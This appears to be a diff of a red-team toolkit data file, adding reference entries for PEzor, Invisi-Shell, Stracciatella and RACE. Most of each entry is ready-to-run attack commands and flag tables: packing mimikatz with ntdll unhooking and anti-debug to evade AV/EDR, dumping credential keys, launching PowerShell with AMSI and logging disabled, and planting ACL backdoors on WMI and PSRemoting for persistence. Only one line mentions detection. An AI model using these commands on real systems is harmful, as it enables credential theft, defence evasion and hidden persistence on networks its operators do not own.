@@ -11572,27 +11572,90 @@ var TOOLKIT = [
         ]
       },
       {
-        id: "pezor",
-        name: "PEzor",
-        url: "https://github.com/phra/PEzor",
-        description: "Open-source PE/shellcode packer that adds evasion (unhooking, anti-debug, sleep, .NET output) to existing tools.",
-        brief: "PEzor is an open-source packer that takes an existing PE or raw shellcode and wraps it with evasion features so a signatured tool (mimikatz, a C2 loader) can run past AV/EDR. It can unhook ntdll to defeat userland API hooks, add anti-debug and memory-permission fluctuation, insert sleeps, and — importantly for C2 workflows — emit a .NET assembly (-format=dotnet) so the packed tool can be launched with execute-assembly. Internally it leans on donut for the PE-to-shellcode conversion.",
-        quickReference: [
-          { label: "Pack a PE to an unhooked .NET assembly", cmd: "./PEzor.sh -unhook -antidebug -fluctuate=NA -format=dotnet -sleep=5 <input.exe>" },
-          { label: "Pass args (e.g. mimikatz)", cmd: "... <mimikatz.exe> -z 2 -b 1 -p '\"privilege::debug\" \"sekurlsa::ekeys\" \"exit\"'" }
-        ],
-        sections: [
+        "id": "pezor",
+        "name": "PEzor",
+        "url": "https://github.com/phra/PEzor",
+        "description": "Open-source PE/shellcode packer that adds evasion (unhooking, anti-debug, sleep, .NET output) to existing tools.",
+        "brief": "PEzor is an open-source packer that takes an existing PE or raw shellcode and wraps it with evasion features so a signatured tool (mimikatz, a C2 loader) can run past AV/EDR. It can unhook ntdll to defeat userland API hooks, add anti-debug and memory-permission fluctuation, insert sleeps, and — importantly for C2 workflows — emit a .NET assembly (-format=dotnet) so the packed tool can be launched with execute-assembly. Internally it leans on donut for the PE-to-shellcode conversion.",
+        "quickReference": [
           {
-            title: "Usage",
-            type: "commands",
-            commands: [
-              { label: "Repack mimikatz for in-memory use", cmd: "./PEzor.sh -unhook -antidebug -fluctuate=NA -format=dotnet -sleep=5 \\\n  /path/mimikatz.exe -z 2 -b 1 -p '\"privilege::debug\" \"token::elevate\" \"sekurlsa::ekeys\" \"exit\"'\n# output: mimikatz.exe.packed.dotnet.exe -> rename per task (-ekeys / -dcsync / -vaultcred)\nexecute-assembly -p explorer.exe -t 180 '/path/mimikatz-ekeys.exe.packed.dotnet.exe'" }
+            "label": "Pack a PE to an unhooked .NET assembly",
+            "cmd": "./PEzor.sh -unhook -antidebug -fluctuate=NA -format=dotnet -sleep=5 <input.exe>"
+          },
+          {
+            "label": "Pass args (e.g. mimikatz)",
+            "cmd": "... <mimikatz.exe> -z 2 -b 1 -p '\"privilege::debug\" \"sekurlsa::ekeys\" \"exit\"'"
+          },
+          {
+            "label": "Pack to raw shellcode",
+            "cmd": "./PEzor.sh -format=shellcode -unhook -antidebug input.exe"
+          }
+        ],
+        "sections": [
+          {
+            "title": "Key flags",
+            "type": "table",
+            "columns": [
+              "Flag",
+              "Description"
+            ],
+            "rows": [
+              [
+                "-format=<fmt>",
+                "Output: exe, dll, reflective-dll, service-exe, service-dll, dotnet, ..."
+              ],
+              [
+                "-unhook",
+                "Restore ntdll (remove user-land API hooks) at runtime"
+              ],
+              [
+                "-antidebug",
+                "Add anti-debug checks"
+              ],
+              [
+                "-syscalls",
+                "Use raw syscalls (x64, Windows 10)"
+              ],
+              [
+                "-sgn",
+                "Encode the embedded shellcode with sgn"
+              ],
+              [
+                "-self",
+                "Run the payload in the same thread"
+              ],
+              [
+                "-sleep=N",
+                "Delay N seconds before unpacking"
+              ],
+              [
+                "-fluctuate=RW|NA",
+                "Flip payload memory to RW / NoAccess during the sleep"
+              ],
+              [
+                "-xorkey=KEY",
+                "XOR-encrypt the payload; key derived from the hostname at runtime"
+              ],
+              [
+                "-z <n> / -b <n>",
+                "Passthrough packing level / bypass level"
+              ]
             ]
           },
           {
-            title: "Why It Works",
-            type: "notes",
-            items: [
+            "title": "Usage",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "Repack mimikatz for in-memory use",
+                "cmd": "./PEzor.sh -unhook -antidebug -fluctuate=NA -format=dotnet -sleep=5 \\\n  /path/mimikatz.exe -z 2 -b 1 -p '\"privilege::debug\" \"token::elevate\" \"sekurlsa::ekeys\" \"exit\"'\n# output: mimikatz.exe.packed.dotnet.exe -> rename per task (-ekeys / -dcsync / -vaultcred)\nexecute-assembly -p explorer.exe -t 180 '/path/mimikatz-ekeys.exe.packed.dotnet.exe'"
+              }
+            ]
+          },
+          {
+            "title": "Why It Works",
+            "type": "notes",
+            "items": [
               "EDRs commonly detect offensive tools two ways: static signatures on the file, and userland hooks placed in ntdll that intercept sensitive API calls. PEzor addresses both — packing/encoding changes the static bytes, and -unhook restores a clean copy of ntdll from disk so the process's syscalls are no longer routed through the vendor's inline hooks.",
               "Anti-debug and memory-permission fluctuation (-fluctuate) reduce the window in which the decrypted payload is scannable in memory, and the sleep delays execution past some sandbox timeouts.",
               "-format=dotnet produces an assembly that execute-assembly can run entirely in memory, so the repacked tool never touches disk on the target.",
@@ -11600,113 +11663,309 @@ var TOOLKIT = [
             ]
           },
           {
-            title: "References",
-            type: "references",
-            items: [
-              { label: "PEzor — GitHub (phra)", url: "https://github.com/phra/PEzor" },
-              { label: "Theory — In-Memory Post-Exploitation Tradecraft", url: "theory/2026-09-23-in-memory-tradecraft.html" }
+            "title": "References",
+            "type": "references",
+            "items": [
+              {
+                "label": "PEzor — GitHub (phra)",
+                "url": "https://github.com/phra/PEzor"
+              },
+              {
+                "label": "Theory — In-Memory Post-Exploitation Tradecraft",
+                "url": "theory/2026-09-23-in-memory-tradecraft.html"
+              }
             ]
           }
         ]
       },
       {
-        id: "invisi-shell",
-        name: "Invisi-Shell",
-        url: "https://github.com/OmerYa/Invisi-Shell",
-        description: "Wrapper that launches PowerShell with logging and AMSI defenses neutralised for the session.",
-        brief: "Invisi-Shell is a helper that spawns a PowerShell instance with the common script-oriented defenses bypassed for that session — Script Block and Module logging, transcription, PSReadline history, and AMSI. It works by hijacking the COM/registry references the runtime resolves at start-up (a non-admin registry variant and an admin PATH variant), so the operator gets a 'quiet' PowerShell without hand-rolling each bypass. It is the standard first step before running PowerShell tooling on a monitored host.",
-        quickReference: [
-          { label: "Non-admin launch", cmd: "C:\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat" },
-          { label: "Admin launch", cmd: "C:\\Tools\\InviShell\\RunWithPathAsAdmin.bat" }
-        ],
-        sections: [
+        "id": "invisi-shell",
+        "name": "Invisi-Shell",
+        "url": "https://github.com/OmerYa/Invisi-Shell",
+        "description": "Wrapper that launches PowerShell with logging and AMSI defenses neutralised for the session.",
+        "brief": "Invisi-Shell is a helper that spawns a PowerShell instance with the common script-oriented defenses bypassed for that session — Script Block and Module logging, transcription, PSReadline history, and AMSI. It works by hijacking the COM/registry references the runtime resolves at start-up (a non-admin registry variant and an admin PATH variant), so the operator gets a 'quiet' PowerShell without hand-rolling each bypass. It is the standard first step before running PowerShell tooling on a monitored host.",
+        "quickReference": [
           {
-            title: "Usage",
-            type: "commands",
-            commands: [
-              { label: "Start a quiet PowerShell, then run tooling", cmd: "# non-admin context:\nC:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat\n# admin context:\nC:\\AD\\Tools\\InviShell\\RunWithPathAsAdmin.bat\n# exit returns to the parent shell (restoring the hijacked references)" }
+            "label": "Non-admin launch",
+            "cmd": "C:\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat"
+          },
+          {
+            "label": "Admin launch",
+            "cmd": "C:\\Tools\\InviShell\\RunWithPathAsAdmin.bat"
+          },
+          {
+            "label": "Then import tooling normally",
+            "cmd": "PS> Import-Module .\\PowerView.ps1"
+          }
+        ],
+        "sections": [
+          {
+            "title": "What it neutralises",
+            "type": "table",
+            "columns": [
+              "Defence",
+              "Effect in the session"
+            ],
+            "rows": [
+              [
+                "AMSI",
+                "Scripts/assemblies are no longer scanned"
+              ],
+              [
+                "Script Block Logging (4104)",
+                "Not recorded"
+              ],
+              [
+                "Module Logging (4103)",
+                "Not recorded"
+              ],
+              [
+                "Transcription",
+                "Disabled"
+              ],
+              [
+                "ETW (PowerShell provider)",
+                "Patched via a CLR profiler loaded before PowerShell starts"
+              ]
             ]
           },
           {
-            title: "Why It Works",
-            type: "notes",
-            items: [
+            "title": "Usage",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "Start a quiet PowerShell, then run tooling",
+                "cmd": "# non-admin context:\nC:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat\n# admin context:\nC:\\AD\\Tools\\InviShell\\RunWithPathAsAdmin.bat\n# exit returns to the parent shell (restoring the hijacked references)"
+              }
+            ]
+          },
+          {
+            "title": "Why It Works",
+            "type": "notes",
+            "items": [
               "AMSI and ETW-based logging are resolved by the .NET/PowerShell runtime through COM and registry references at start-up. Invisi-Shell registers its own entries so the runtime binds to a no-op implementation for the child process — no in-memory patching of AMSI is needed because the provider is never wired up in the first place.",
               "It only affects the session it launches; parent and sibling processes keep their normal logging, which limits the footprint.",
               "The controls it neutralises are described on the Windows Telemetry theory page — Invisi-Shell is the automation of those bypasses."
             ]
           },
           {
-            title: "References",
-            type: "references",
-            items: [
-              { label: "Invisi-Shell — GitHub (OmerYa)", url: "https://github.com/OmerYa/Invisi-Shell" },
-              { label: "Theory — Windows Telemetry & PowerShell Logging", url: "theory/2026-09-23-windows-telemetry-logging.html" }
+            "title": "References",
+            "type": "references",
+            "items": [
+              {
+                "label": "Invisi-Shell — GitHub (OmerYa)",
+                "url": "https://github.com/OmerYa/Invisi-Shell"
+              },
+              {
+                "label": "Theory — Windows Telemetry & PowerShell Logging",
+                "url": "theory/2026-09-23-windows-telemetry-logging.html"
+              }
             ]
           }
         ]
       },
       {
-        id: "stracciatella",
-        name: "Stracciatella",
-        url: "https://github.com/mgeeky/Stracciatella",
-        description: "Runs PowerShell scripts through a custom runspace with AMSI, Script Block logging and transcription patched out.",
-        brief: "Stracciatella executes PowerShell within a custom .NET runspace that has AMSI, Script Block logging and transcription disabled, and is itself distributed as a .NET assembly so it can run in memory via execute-assembly. It fills the gap where a technique only exists as a PowerShell script (no C# port) but the host is monitored — the script runs inside Stracciatella's clean runspace rather than the instrumented default one.",
-        quickReference: [
-          { label: "Run a PowerShell command/script cleanly", cmd: "Stracciatella.exe -e \"<command>\"   |   -f <script.ps1>" }
-        ],
-        sections: [
+        "id": "stracciatella",
+        "name": "Stracciatella",
+        "url": "https://github.com/mgeeky/Stracciatella",
+        "description": "Runs PowerShell scripts through a custom runspace with AMSI, Script Block logging and transcription patched out.",
+        "brief": "Stracciatella executes PowerShell within a custom .NET runspace that has AMSI, Script Block logging and transcription disabled, and is itself distributed as a .NET assembly so it can run in memory via execute-assembly. It fills the gap where a technique only exists as a PowerShell script (no C# port) but the host is monitored — the script runs inside Stracciatella's clean runspace rather than the instrumented default one.",
+        "quickReference": [
           {
-            title: "Usage (via Sliver execute-assembly)",
-            type: "commands",
-            commands: [
-              { label: "Run PowerShell in a patched runspace", cmd: "execute-assembly -p explorer.exe -t 120 '/path/Stracciatella.exe' '-e \"<powershell here>\"'\n# used e.g. to run icacls / PowerShell-only enumeration where a C# equivalent doesn't exist" }
+            "label": "Run a command",
+            "cmd": "Stracciatella.exe -c \"whoami; Get-Process\""
+          },
+          {
+            "label": "Run a script",
+            "cmd": "Stracciatella.exe -s .\\PowerView.ps1"
+          },
+          {
+            "label": "Stealthier (leave CLM alone, no artefacts)",
+            "cmd": "Stracciatella.exe -C -c \"<command>\""
+          }
+        ],
+        "sections": [
+          {
+            "title": "Key flags",
+            "type": "table",
+            "columns": [
+              "Flag",
+              "Description"
+            ],
+            "rows": [
+              [
+                "-s <path>",
+                "Run a PowerShell script file"
+              ],
+              [
+                "-c \"<cmd>\"",
+                "Run the given command(s)"
+              ],
+              [
+                "-e",
+                "Treat the input command as encoded"
+              ],
+              [
+                "-x <key>",
+                "Input is XOR-encoded (one-byte key)"
+              ],
+              [
+                "-p <name>",
+                "Read commands from a named pipe"
+              ],
+              [
+                "-t <ms>",
+                "Timeout in milliseconds"
+              ],
+              [
+                "-C",
+                "Don't disable Constrained Language Mode (stealthier, no artefacts)"
+              ],
+              [
+                "-n",
+                "Don't clean up CLM-disable leftovers"
+              ],
+              [
+                "-f",
+                "Proceed even if the defences were not disabled"
+              ]
             ]
           },
           {
-            title: "Why It Works",
-            type: "notes",
-            items: [
+            "title": "Usage (via Sliver execute-assembly)",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "Clean interactive runspace",
+                "cmd": "Stracciatella.exe        # a PowerShell runspace with AMSI / 4104 / transcription off"
+              },
+              {
+                "label": "One command or a script",
+                "cmd": "Stracciatella.exe -c \"<command>\"\nStracciatella.exe -s .\\script.ps1"
+              }
+            ]
+          },
+          {
+            "title": "Why It Works",
+            "type": "notes",
+            "items": [
               "PowerShell's AMSI and logging are properties of the runspace/engine that hosts the script. Stracciatella creates its own runspace with those features turned off before any script runs, so the script executes in an environment that was never instrumented, rather than trying to disable instrumentation after the fact.",
               "Being a .NET assembly, it runs entirely in memory through execute-assembly — no PowerShell.exe process and no script on disk."
             ]
           },
           {
-            title: "References",
-            type: "references",
-            items: [
-              { label: "Stracciatella — GitHub (mgeeky)", url: "https://github.com/mgeeky/Stracciatella" },
-              { label: "Theory — Windows Telemetry & PowerShell Logging", url: "theory/2026-09-23-windows-telemetry-logging.html" }
+            "title": "References",
+            "type": "references",
+            "items": [
+              {
+                "label": "Stracciatella — GitHub (mgeeky)",
+                "url": "https://github.com/mgeeky/Stracciatella"
+              },
+              {
+                "label": "Theory — Windows Telemetry & PowerShell Logging",
+                "url": "theory/2026-09-23-windows-telemetry-logging.html"
+              }
             ]
           }
         ]
       },
       {
-        id: "race-toolkit",
-        name: "RACE",
-        url: "https://github.com/samratashok/RACE",
-        description: "PowerShell toolkit for stealthy AD persistence and privilege escalation by editing security descriptors (WMI, PSRemoting, registry).",
-        brief: "RACE (Reconfigure ACLs in the Cloud/Enterprise) is a PowerShell toolkit that abuses Windows security descriptors for stealthy persistence and privilege escalation. Its Set-RemoteWMI and Set-RemotePSRemoting functions grant a chosen low-privileged user remote code-execution rights by editing the DACLs on the WMI namespace and the WinRM endpoint — a file-less, account-less backdoor. To run it from a C2 that prefers .NET, RACE.ps1 is made executable (appending a call and compiling with PS2EXE) so it can go through execute-assembly.",
-        quickReference: [
-          { label: "Backdoor remote WMI", cmd: "Set-RemoteWMI -SamAccountName <user> -ComputerName <host> -namespace 'root\\cimv2'" },
-          { label: "Backdoor PSRemoting", cmd: "Set-RemotePSRemoting -SamAccountName <user> -ComputerName <host>" },
-          { label: "Revert", cmd: "... -Remove" }
-        ],
-        sections: [
+        "id": "race-toolkit",
+        "name": "RACE",
+        "url": "https://github.com/samratashok/RACE",
+        "description": "PowerShell toolkit for stealthy AD persistence and privilege escalation by editing security descriptors (WMI, PSRemoting, registry).",
+        "brief": "RACE (Reconfigure ACLs in the Cloud/Enterprise) is a PowerShell toolkit that abuses Windows security descriptors for stealthy persistence and privilege escalation. Its Set-RemoteWMI and Set-RemotePSRemoting functions grant a chosen low-privileged user remote code-execution rights by editing the DACLs on the WMI namespace and the WinRM endpoint — a file-less, account-less backdoor. To run it from a C2 that prefers .NET, RACE.ps1 is made executable (appending a call and compiling with PS2EXE) so it can go through execute-assembly.",
+        "quickReference": [
           {
-            title: "Usage",
-            type: "commands",
-            commands: [
-              { label: "Grant a low-priv user remote WMI / PSRemoting", cmd: "# compile RACE.ps1 -> .NET (PS2EXE) and run via execute-assembly, or run in a Stracciatella runspace:\nSet-RemoteWMI      -SamAccountName <user> -ComputerName <dc> -namespace 'root\\cimv2' -Verbose\nSet-RemotePSRemoting -SamAccountName <user> -ComputerName <dc> -Verbose" },
-              { label: "Return later as the low-priv user", cmd: "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList \"cmd /c ...\" -ComputerName <dc>\nEnter-PSSession -ComputerName <dc>" }
+            "label": "Backdoor remote WMI",
+            "cmd": "Set-RemoteWMI -SamAccountName <user> -ComputerName <host> -namespace 'root\\cimv2'"
+          },
+          {
+            "label": "Backdoor PSRemoting",
+            "cmd": "Set-RemotePSRemoting -SamAccountName <user> -ComputerName <host>"
+          },
+          {
+            "label": "Revert",
+            "cmd": "... -Remove"
+          }
+        ],
+        "sections": [
+          {
+            "title": "Functions",
+            "type": "table",
+            "columns": [
+              "Function",
+              "What it backdoors"
+            ],
+            "rows": [
+              [
+                "Set-RemotePSRemoting",
+                "PS Remoting ACL so a non-admin can connect"
+              ],
+              [
+                "Set-RemoteWMI",
+                "A WMI namespace ACL (e.g. -namespace root\\cimv2)"
+              ],
+              [
+                "Set-RemoteRegistryPermissions",
+                "Remote-registry ACLs"
+              ],
+              [
+                "Set-RemoteServicePermissions / Set-RemoteServiceAbuse",
+                "A service DACL, then abuse it"
+              ],
+              [
+                "Set-DCOMPermissions / Invoke-DCOMAbuse",
+                "DCOM access for a non-admin, then abuse it"
+              ],
+              [
+                "Set-DCPermissions -Method AdminSDHolder|RBCD",
+                "DC-level persistence via object ACLs"
+              ],
+              [
+                "Set-DCShadowPermissions",
+                "Rights needed to run DCShadow"
+              ],
+              [
+                "Common params",
+                "-SamAccountName -ComputerName -Credential -Remove (revert)"
+              ]
             ]
           },
           {
-            title: "References",
-            type: "references",
-            items: [
-              { label: "RACE — GitHub (samratashok)", url: "https://github.com/samratashok/RACE" },
-              { label: "Vulns — Security Descriptor / ACL Backdoors", url: "vulns.html" }
+            "title": "Usage",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "Grant a low-priv user remote WMI / PSRemoting",
+                "cmd": "# compile RACE.ps1 -> .NET (PS2EXE) and run via execute-assembly, or run in a Stracciatella runspace:\nSet-RemoteWMI      -SamAccountName <user> -ComputerName <dc> -namespace 'root\\cimv2' -Verbose\nSet-RemotePSRemoting -SamAccountName <user> -ComputerName <dc> -Verbose"
+              },
+              {
+                "label": "Return later as the low-priv user",
+                "cmd": "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList \"cmd /c ...\" -ComputerName <dc>\nEnter-PSSession -ComputerName <dc>"
+              }
+            ]
+          },
+          {
+            "title": "Notes & Tips",
+            "type": "notes",
+            "items": [
+              "These are security-descriptor (SDDL) edits, not new accounts or binaries — they are quiet and survive password resets, which is what makes them good persistence.",
+              "Setting a backdoor needs admin on the target; -Remove reverts the ACL. Detection: monitor ACL changes on WMI/PSRemoting/registry and on AdminSDHolder."
+            ]
+          },
+          {
+            "title": "References",
+            "type": "references",
+            "items": [
+              {
+                "label": "RACE — GitHub (samratashok)",
+                "url": "https://github.com/samratashok/RACE"
+              },
+              {
+                "label": "Vulns — Security Descriptor / ACL Backdoors",
+                "url": "vulns.html"
+              }
             ]
           }
         ]
